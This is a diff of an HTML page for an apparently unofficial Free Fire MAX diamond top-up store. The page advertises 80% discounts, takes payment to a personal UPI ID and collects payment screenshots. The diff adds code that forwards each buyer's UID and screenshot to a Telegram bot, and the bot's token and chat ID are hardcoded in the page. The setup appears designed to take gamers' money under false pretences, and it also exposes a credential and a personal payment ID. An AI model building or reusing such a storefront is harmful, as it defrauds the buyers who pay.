@@ -3,190 +3,70 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>FF-AXL | Official Top-Up Store</title>
+<title>FF-AXL | Pro Bot Store</title>
 <script src="https://cdn.tailwindcss.com"></script>
 <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
 <style>
 @import url('https://fonts.googleapis.com/css2?family=Oswald:wght@700&family=Inter:wght@400;700;900&display=swap');
-
-body {
-    background-color: #070912;
-    color: #ffffff;
-    font-family: 'Inter', sans-serif;
-    background-image: radial-gradient(circle at 50% 0%, #1a2235 0%, #070912 100%);
-    background-attachment: fixed;
-}
-
+body { background-color: #070912; color: #ffffff; font-family: 'Inter', sans-serif; background-image: radial-gradient(circle at 50% 0%, #1a2235 0%, #070912 100%); background-attachment: fixed; }
 .ff-font { font-family: 'Oswald', sans-serif; }
-
-.card-pro {
-    background: #121625;
-    border: 1px solid rgba(255, 255, 255, 0.05);
-    border-radius: 16px;
-    transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-    cursor: pointer;
-    position: relative;
-    overflow: hidden;
-}
-
-.card-pro:hover, .card-pro.selected {
-    border-color: #00e5ff;
-    background: linear-gradient(145deg, #161c30 0%, #070912 100%);
-    box-shadow: 0 0 25px rgba(0, 229, 255, 0.2);
-    transform: translateY(-5px);
-}
-
-.bundle-img {
-    width: 100%;
-    height: 85px;
-    object-fit: contain;
-    filter: drop-shadow(0 0 8px rgba(0, 229, 255, 0.4));
-    margin-bottom: 5px;
-}
-
-.badge-discount {
-    background: #ff3e3e;
-    color: white;
-    font-size: 10px;
-    font-weight: 900;
-    padding: 2px 8px;
-    border-radius: 4px;
-    position: absolute;
-    top: 10px;
-    right: 10px;
-    z-index: 10;
-}
-
-.price-tag {
-    background: #ffcc00;
-    color: #000;
-    font-weight: 900;
-    padding: 6px;
-    border-radius: 6px;
-    font-size: 14px;
-    margin-top: 5px;
-    box-shadow: 0 4px 0 #b38f00;
-}
-
-#payment-overlay {
-    display: none;
-    position: fixed;
-    inset: 0;
-    background: #070912;
-    z-index: 1000;
-    overflow-y: auto;
-}
-
-.ff-btn-main {
-    background: linear-gradient(90deg, #00e5ff, #00a2ff);
-    color: #000;
-    font-weight: 900;
-    text-transform: uppercase;
-}
+.card-pro { background: #121625; border: 1px solid rgba(255, 255, 255, 0.05); border-radius: 16px; transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); cursor: pointer; position: relative; overflow: hidden; }
+.card-pro.selected { border-color: #00e5ff; background: linear-gradient(145deg, #161c30 0%, #070912 100%); box-shadow: 0 0 25px rgba(0, 229, 255, 0.2); }
+.bundle-img { width: 100%; height: 85px; object-fit: contain; filter: drop-shadow(0 0 8px rgba(0, 229, 255, 0.4)); margin-bottom: 5px; }
+.badge-discount { background: #ff3e3e; color: white; font-size: 10px; font-weight: 900; padding: 2px 8px; border-radius: 4px; position: absolute; top: 10px; right: 10px; z-index: 10; }
+.price-tag { background: #ffcc00; color: #000; font-weight: 900; padding: 6px; border-radius: 6px; font-size: 14px; margin-top: 5px; box-shadow: 0 4px 0 #b38f00; }
+#payment-overlay { display: none; position: fixed; inset: 0; background: #070912; z-index: 1000; overflow-y: auto; }
 </style>
 </head>
 <body class="pb-20">
 
-<header class="py-12 text-center">
+<header class="py-10 text-center">
     <h1 class="ff-font text-5xl font-bold italic text-white uppercase tracking-tighter">FF-AXL <span class="text-cyan-400">PRO</span></h1>
 </header>
 
 <main class="max-w-md mx-auto px-6 space-y-8">
-    <div class="card-pro p-6">
+    <div class="card-pro p-6 shadow-2xl">
         <label class="text-[10px] font-black text-gray-500 uppercase tracking-widest block mb-3">Target Player UID</label>
         <input type="number" id="uid" placeholder="ENTER FF UID" class="w-full bg-black/40 border border-white/10 p-4 rounded-xl text-xl font-bold text-white focus:outline-none focus:border-cyan-500 transition-all">
     </div>
 
     <div class="grid grid-cols-2 gap-4">
-        <div class="card-pro p-5 text-center" onclick="select(this, '100 💎 Bundle', 16)">
-            <div class="badge-discount">80% OFF</div>
-            <img src="Screenshot_20260404-182232_Free Fire MAX~3.png" class="bundle-img">
-            <p class="font-black italic text-sm">100 💎</p>
-            <p class="text-[10px] text-gray-500 line-through">₹80.00</p>
-            <div class="price-tag">₹16.00</div>
-        </div>
-
-        <div class="card-pro p-5 text-center" onclick="select(this, '310 💎 Bundle', 48)">
-            <div class="badge-discount">80% OFF</div>
-            <img src="Screenshot_20260404-182232_Free Fire MAX~4.png" class="bundle-img">
-            <p class="font-black italic text-sm">310 💎</p>
-            <p class="text-[10px] text-gray-500 line-through">₹240.00</p>
-            <div class="price-tag">₹48.00</div>
-        </div>
-
-        <div class="card-pro p-5 text-center" onclick="select(this, '520 💎 Bundle', 80)">
-            <div class="badge-discount">80% OFF</div>
-            <img src="Screenshot_20260404-182232_Free Fire MAX~5.png" class="bundle-img">
-            <p class="font-black italic text-sm">520 💎</p>
-            <p class="text-[10px] text-gray-500 line-through">₹400.00</p>
-            <div class="price-tag">₹80.00</div>
-        </div>
-
-        <div class="card-pro p-5 text-center" onclick="select(this, '1060 💎 Bundle', 160)">
-            <div class="badge-discount">80% OFF</div>
-            <img src="Screenshot_20260404-182232_Free Fire MAX~6.png" class="bundle-img">
-            <p class="font-black italic text-sm">1060 💎</p>
-            <p class="text-[10px] text-gray-500 line-through">₹800.00</p>
-            <div class="price-tag">₹160.00</div>
-        </div>
-
-        <div class="card-pro p-5 text-center" onclick="select(this, '2180 💎 Bundle', 320)">
-            <div class="badge-discount">80% OFF</div>
-            <img src="Screenshot_20260404-182232_Free Fire MAX~7.png" class="bundle-img">
-            <p class="font-black italic text-sm">2180 💎</p>
-            <p class="text-[10px] text-gray-500 line-through">₹1,600.00</p>
-            <div class="price-tag">₹320.00</div>
-        </div>
-
-        <div class="card-pro p-5 text-center" onclick="select(this, '5600 💎 Bundle', 800)">
-            <div class="badge-discount">80% OFF</div>
-            <img src="Screenshot_20260404-182232_Free Fire MAX~8.png" class="bundle-img">
-            <p class="font-black italic text-sm">5600 💎</p>
-            <p class="text-[10px] text-gray-500 line-through">₹4,000.00</p>
-            <div class="price-tag">₹800.00</div>
-        </div>
+        <div class="card-pro p-5 text-center" onclick="select(this, '100 💎 Bundle', 16)"><div class="badge-discount">80% OFF</div><img src="Screenshot_20260404-182232_Free Fire MAX~3.png" class="bundle-img"><p class="font-black italic text-sm">100 💎</p><p class="text-[10px] text-gray-500 line-through">₹80.00</p><div class="price-tag">₹16.00</div></div>
+        <div class="card-pro p-5 text-center" onclick="select(this, '310 💎 Bundle', 48)"><div class="badge-discount">80% OFF</div><img src="Screenshot_20260404-182232_Free Fire MAX~4.png" class="bundle-img"><p class="font-black italic text-sm">310 💎</p><p class="text-[10px] text-gray-500 line-through">₹240.00</p><div class="price-tag">₹48.00</div></div>
+        <div class="card-pro p-5 text-center" onclick="select(this, '520 💎 Bundle', 80)"><div class="badge-discount">80% OFF</div><img src="Screenshot_20260404-182232_Free Fire MAX~5.png" class="bundle-img"><p class="font-black italic text-sm">520 💎</p><p class="text-[10px] text-gray-500 line-through">₹400.00</p><div class="price-tag">₹80.00</div></div>
+        <div class="card-pro p-5 text-center" onclick="select(this, '1060 💎 Bundle', 160)"><div class="badge-discount">80% OFF</div><img src="Screenshot_20260404-182232_Free Fire MAX~6.png" class="bundle-img"><p class="font-black italic text-sm">1060 💎</p><p class="text-[10px] text-gray-500 line-through">₹800.00</p><div class="price-tag">₹160.00</div></div>
+        <div class="card-pro p-5 text-center" onclick="select(this, '2180 💎 Bundle', 320)"><div class="badge-discount">80% OFF</div><img src="Screenshot_20260404-182232_Free Fire MAX~7.png" class="bundle-img"><p class="font-black italic text-sm">2180 💎</p><p class="text-[10px] text-gray-500 line-through">₹1,600.00</p><div class="price-tag">₹320.00</div></div>
+        <div class="card-pro p-5 text-center" onclick="select(this, '5600 💎 Bundle', 800)"><div class="badge-discount">80% OFF</div><img src="Screenshot_20260404-182232_Free Fire MAX~8.png" class="bundle-img"><p class="font-black italic text-sm">5600 💎</p><p class="text-[10px] text-gray-500 line-through">₹4,000.00</p><div class="price-tag">₹800.00</div></div>
     </div>
 
-    <button onclick="openPay()" class="w-full ff-btn-main py-5 rounded-2xl text-xl font-black shadow-lg">
-        Checkout Now
-    </button>
+    <button onclick="openPay()" class="w-full bg-cyan-500 text-black py-5 rounded-2xl text-xl font-black shadow-lg">Checkout Now</button>
 </main>
 
 <div id="payment-overlay">
     <div class="p-6 flex items-center border-b border-white/5 bg-white/5">
-        <button onclick="closePay()" class="w-10 h-10 flex items-center justify-center bg-white/5 rounded-full text-cyan-400">
-            <i class="fas fa-times"></i>
-        </button>
-        <span class="ff-font text-xl uppercase italic ml-4">Secure Payment</span>
+        <button onclick="closePay()" class="text-cyan-400 mr-4"><i class="fas fa-times"></i></button>
+        <span class="ff-font text-xl">Secure Payment</span>
     </div>
-    
     <div class="p-8 text-center space-y-8">
-        <div>
-            <p id="item-name" class="text-gray-500 text-xs font-bold uppercase tracking-widest"></p>
-            <h3 id="item-price" class="text-6xl font-black text-cyan-400 ff-font mt-1"></h3>
-        </div>
-
-        <div class="bg-white p-4 rounded-2xl inline-block shadow-2xl">
-            <img src="Screenshot_20260405-074910_GPay.png" class="w-64 h-auto rounded-lg">
-        </div>
-
+        <div><p id="item-name" class="text-gray-500 text-xs font-bold uppercase"></p><h3 id="item-price" class="text-6xl font-black text-cyan-400 ff-font mt-1"></h3></div>
+        <div class="bg-white p-4 rounded-2xl inline-block shadow-2xl"><img src="Screenshot_20260405-074910_GPay.png" class="w-64 h-auto rounded-lg"></div>
         <div class="space-y-4">
-            <p class="text-cyan-500 font-bold text-sm tracking-widest">UPI ID: 8860269931@ybl</p>
-            <div class="p-6 bg-black/40 border-2 border-dashed border-white/10 rounded-2xl">
-                <input type="file" id="proof" class="hidden" onchange="updateFileLabel(this)">
-                <label for="proof" id="file-label" class="cursor-pointer">
-                    <i class="fas fa-camera text-3xl text-gray-600 mb-2"></i>
-                    <p class="text-[10px] text-gray-500 font-bold uppercase">Upload Payment Screenshot</p>
-                </label>
-            </div>
-            <button onclick="finish()" class="w-full bg-green-500 text-white py-5 rounded-2xl font-black uppercase text-sm tracking-widest shadow-xl">
-                Submit Order
-            </button>
+            <p class="text-cyan-500 font-bold">UPI ID: 8860269931@ybl</p>
+            <input type="file" id="proof" class="hidden" onchange="updateFileLabel(this)">
+            <label for="proof" id="file-label" class="block p-6 bg-black/40 border-2 border-dashed border-white/10 rounded-2xl cursor-pointer">
+                <p class="text-xs text-gray-500 font-bold uppercase">Upload Payment Screenshot</p>
+            </label>
+            <button id="submit-btn" onclick="finish()" class="w-full bg-green-500 text-white py-5 rounded-2xl font-black uppercase text-sm shadow-xl">Submit Order</button>
         </div>
     </div>
 </div>
 
 <script>
+// --- AUTOMATIC TELEGRAM CONFIG ---
+const BOT_TOKEN = "8708010864:AAH8ImmwqcPK00Vga9IOsXbvtmiuEmgLixE"; 
+const CHAT_ID = "8708010864"; 
+// -----------------------
+
 let selected = null;
 function select(el, pack, price) {
     document.querySelectorAll('.card-pro').forEach(c => c.classList.remove('selected'));
@@ -195,23 +75,44 @@ function select(el, pack, price) {
 }
 function openPay() {
     const u = document.getElementById('uid').value;
-    if(!u || u.length < 5) return alert("❌ Please enter a valid Player UID");
-    if(!selected) return alert("💎 Please select a Diamond Bundle");
+    if(!u || u.length < 5) return alert("❌ Enter Valid UID");
+    if(!selected) return alert("💎 Select Diamond Pack");
     document.getElementById('item-name').innerText = selected.pack;
-    document.getElementById('item-price').innerText = "₹" + selected.price.toLocaleString();
+    document.getElementById('item-price').innerText = "₹" + selected.price;
     document.getElementById('payment-overlay').style.display = "block";
 }
 function closePay() { document.getElementById('payment-overlay').style.display = "none"; }
-function updateFileLabel(input) {
-    if(input.files[0]) {
-        document.getElementById('file-label').innerHTML = `<i class="fas fa-check-circle text-3xl text-green-500 mb-2"></i><p class="text-green-500 font-bold uppercase text-[10px]">Image Selected</p>`;
-    }
-}
-function finish() {
+function updateFileLabel(input) { if(input.files[0]) document.getElementById('file-label').innerHTML = `<p class="text-green-400 font-bold">SS READY ✅</p>`; }
+
+async function finish() {
+    const uid = document.getElementById('uid').value;
     const proof = document.getElementById('proof').files[0];
-    if(!proof) return alert("📸 Please upload payment proof first!");
-    alert("✅ Order Received! Diamonds will be credited within 15 minutes.");
-    location.reload();
+    const btn = document.getElementById('submit-btn');
+
+    if(!proof) return alert("📸 Screenshot upload karein!");
+    
+    btn.innerText = "SENDING ORDER...";
+    btn.disabled = true;
+
+    const text = `🔥 NEW ORDER RECIEVED! 🔥\n\n👤 Player UID: ${uid}\n💎 Package: ${selected.pack}\n💸 Amount: ₹${selected.price}\n\n✅ Check screenshot below.`;
+    
+    const formData = new FormData();
+    formData.append('chat_id', CHAT_ID);
+    formData.append('caption', text);
+    formData.append('photo', proof);
+
+    try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+        });
+        alert("✅ Success! Your order has been sent to our team via Telegram.");
+        location.reload();
+    } catch (err) {
+        alert("❌ Error! Bot config issue. Please check Token.");
+        btn.disabled = false;
+        btn.innerText = "Submit Order";
+    }
 }
 </script>
 </body>
